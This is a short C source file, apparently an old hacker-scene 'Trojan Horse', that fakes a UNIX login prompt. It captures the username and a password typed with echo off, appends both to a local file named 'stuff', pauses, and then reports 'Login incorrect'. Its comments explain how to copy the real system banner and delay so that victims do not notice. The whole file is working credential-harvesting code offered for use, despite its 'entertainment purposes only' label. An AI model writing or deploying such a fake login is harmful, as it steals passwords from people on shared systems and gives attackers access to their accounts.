/* horse.c  - Trojan Horse program.  For entertainment purposes only.
 * Written by Shooting Shark.
 */

#include <curses.h>

main()
{
char name[10], password[10];
int i;
FILE *fp, *fopen();
initscr();

printf("\n\nPyramid Technology 4.2/5.0 UNIX (tiburon)\n\n\n\nlogin: ");

/* You will need to alter the above line so it prints your system's
header.  Each '\n' is a carriage return. */


scanf("%[^\n]",name);
getchar();
noecho();
printf("Password:");
scanf("%[^\n]",password);
printf("\n");
getchar();
echo();
sleep(5);

/* change the 'sleep(x)' above to give a delay similar to the delay your
system gives. An instant "Login incorrect" looks supicious. */


if ( ( fp = fopen("stuff","a") )  != -1 ) {
        fprintf(fp,"login %s has password %s\n",name,password);
        fclose(fp);
        }

printf("Login incorrect\n");
endwin();
}
